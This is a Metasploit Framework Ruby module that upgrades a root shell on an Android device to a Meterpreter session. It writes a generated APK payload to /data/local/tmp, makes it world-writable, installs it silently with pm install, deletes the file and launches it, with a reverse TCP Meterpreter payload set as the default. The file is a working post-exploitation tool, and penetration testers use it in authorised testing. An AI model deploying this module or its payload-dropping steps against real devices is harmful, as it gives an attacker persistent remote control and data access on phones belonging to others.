##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit4 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
        'Name'          => 'Android Meterpreter Upgrade',
        'Description'   => %q{
          This module upgrades a root android shell to meterpreter
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'anwar',
                             'jvazquez',
                             'timwr' ],
        'SessionTypes'  => [ 'shell' ],
        'Platform'       => 'android',
        'Targets'        => [[ 'Automatic', { }]],
        'Arch'           => ARCH_DALVIK,
        'DefaultOptions' =>
          {
            'PAYLOAD'  => 'android/meterpreter/reverse_tcp',
          },
        'DefaultTarget' => 0
      }
    ))

    register_options([
        OptString.new("WritableDir", [ true, "A directory where we can write files", "/data/local/tmp" ]),
      ], self.class)
  end

  def check
    if session.shell_command_token('/system/bin/pm install') =~ /pkg/
      return CheckCode::Vulnerable
    end
    return CheckCode::Safe
  end

  def exploit
    apkfile = "#{datastore['WritableDir']}/#{rand_text_alpha(3 + rand(5))}.apk"

    print_status("Generating payload")
    apkdata = payload.raw
    hex = "#{Rex::Text.to_hex(apkdata, '\\x')}";
    cmd = 'echo "' + hex + '" > ' + apkfile
    print_status("Dropping payload to #{apkfile}...")
    session.shell_command_token(cmd)
    session.shell_command_token('/system/bin/chmod 777 ' + apkfile)
    session.shell_command_token('/system/bin/pm install ' + apkfile)
    session.shell_command_token('/system/bin/rm ' + apkfile)
    session.shell_command_token('/system/bin/am start -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity')
  end

end

